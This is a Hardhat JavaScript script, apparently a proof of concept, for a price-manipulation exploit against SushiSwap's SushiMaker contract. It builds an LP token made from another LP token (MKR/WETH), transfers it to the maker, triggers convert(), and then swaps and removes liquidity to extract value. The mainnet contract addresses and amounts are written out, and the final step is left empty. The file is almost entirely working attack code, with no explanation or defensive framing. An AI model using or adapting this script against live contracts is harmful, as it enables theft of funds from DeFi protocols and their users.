const { ethers } = require("hardhat");

async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');
  
    const [signer] = await ethers.getSigners();
    console.log("signer address is: ",signer.address, "the balance of ETH is: ", await signer.getBalance());
    console.log("the block number is :", await ethers.provider.getBlockNumber());


    const factory = "0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac";
    const MKR_WETH = "0xBa13afEcda9beB75De5c56BbAF696b880a5A50dD";
    const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    const MKR = "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2";
    const SUSHI_Router = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F";
    const slp1 = "0xF27f48415a5909710B0d204b9BDc9E433516e9D7";
    const sushi_maker = "0x6684977bBED67e101BB80Fc07fCcfba655c0a64F";
  
  
    const erc20_abi = ["function balanceOf(address account) external view returns (uint256)", "function approve(address spender, uint256 amount) external returns (bool)", "function transferFrom(address from, address to, uint256 amount) external returns (bool)", "function transfer(address to, uint value) external returns (bool)"];
    const router_abi = ["function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)", "function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity)", "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)", "function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)", "function removeLiquidityETH(address token,uint liquidity,uint amountTokenMin,uint amountETHMin,address to,uint deadline) external returns (uint amountToken, uint amountETH)"];
    const uni_pair_abi = ["function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast)"];
    const maker_abi = ["function convert(address token0, address token1) external"];
    const factory_abi = ["function feeTo() external view returns (address)", "function swapFee() external view returns (uint)", "function withdrawFee() external view returns (uint)", "function withdrawFeeTo() external view returns (address)", "function migrator() external view returns (address)", "function getPair(address tokenA, address tokenB) external view returns (address pair)"];

    const WETH_token = new ethers.Contract(WETH, erc20_abi, signer);
    const MKR_token = new ethers.Contract(MKR, erc20_abi, signer);
    const MKR_WETH_token = new ethers.Contract(MKR_WETH, erc20_abi, signer);
    const slp1_token = new ethers.Contract(slp1, erc20_abi, signer);

    const sushi_factory = new ethers.Contract(factory, factory_abi, signer);
    const Router = new ethers.Contract(SUSHI_Router, router_abi, signer);
    const maker = new ethers.Contract(sushi_maker, maker_abi, signer);
    const MKR_WETH_pair = new ethers.Contract(MKR_WETH, uni_pair_abi, signer);
    const slp1_pair = new ethers.Contract(slp1, uni_pair_abi, signer);

    // We get the contract to deploy after 1 day...
    // await ethers.provider.send("evm_increaseTime", [1.5 * 24 * 60 * 60]);
    
    //1xxxxx swapexactETHfortokens
    // console.log("MKR_WETH pair reserve: ", await MKR_WETH_pair.getReserves());
    await Router.swapExactETHForTokens(0, [WETH, MKR], signer.address, Date.now(), {value : ethers.utils.parseEther('0.000978473581')});
    var MKR_amount = await MKR_token.balanceOf(signer.address);
    console.log("1xxxxx my account has got MKR_amount: ", MKR_amount, await ethers.provider.getBlockNumber());

    //2xxxxx addliquidity to get slp
    await MKR_token.approve(SUSHI_Router, BigInt(99999999999999999999999999999));
    await Router.addLiquidityETH(MKR, BigInt(974160661490720), BigInt(969289858183266), BigInt(970667241886050), signer.address, Date.now(), {value : ethers.utils.parseEther('0.000975544966719')});
    var MKR_WETH_token_amount = await MKR_WETH_token.balanceOf(signer.address);
    // var maker_amount = await MKR_WETH_token.balanceOf(sushi_maker);
    console.log("2xxxxx my account has got MKR_WETH_lp_amount: ", MKR_WETH_token_amount);
    
    //3xxxxx addliquidity to get slp1
    await MKR_WETH_token.approve(SUSHI_Router, BigInt(99999999999999999999999999999));
    await Router.addLiquidityETH(MKR_WETH, MKR_WETH_token_amount, BigInt(971301744400000), BigInt(1949317740000000), signer.address, Date.now(), {value : ethers.utils.parseEther('0.00194931774')});
    // var slp1_addr = await sushi_factory.getPair(MKR_WETH, WETH);
    // console.log("3xxxxx ----- slp1 pair reserve: ", await slp1_pair.getReserves());
    var slp1_token_amount = await slp1_token.balanceOf(signer.address);
    console.log("3xxxxx my account has got slp1_token: ", slp1_token_amount, await ethers.provider.getBlockNumber());

    //4xxxxx tansfer slp1 to maker
    await slp1_token.transfer(sushi_maker, slp1_token_amount);
    console.log("4xxxxx sushi_maker has got slp1_token: ", await slp1_token.balanceOf(sushi_maker), await ethers.provider.getBlockNumber());

    //5xxxxx convert (let maker swap in slp1)
    await maker.convert(MKR_WETH, WETH);
    // console.log("5xxxxx slp1 pair reserve: ", await slp1_pair.getReserves());

    //6xxxxx swap slp1
    await Router.swapExactETHForTokens(0, [WETH, MKR_WETH], signer.address, Date.now(), {value : ethers.utils.parseEther('0.000000001')});
    var MKR_WETH_lp_amount_remain = await MKR_WETH_token.balanceOf(signer.address);
    console.log("6xxxxx my account has got MKR_WETH_lp_amount: ", MKR_WETH_lp_amount_remain);

    //7xxxxx removeliquidity slp1
    await Router.removeLiquidityETH(MKR, MKR_WETH_lp_amount_remain, 0, 0, signer.address, Date.now());
    var MKR_remain = await MKR_token.balanceOf(signer.address);
    // var WETH_remain = await WETH_token.balanceOf(signer.address);
    console.log("7xxxxx remove liquidity to get MKR and WETH: ", MKR_remain, await signer.getBalance());

    //8xxxxx swapexacttokensforETH

}
  
  // We recommend this pattern to be able to use async/await everywhere
  // and properly handle errors.
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });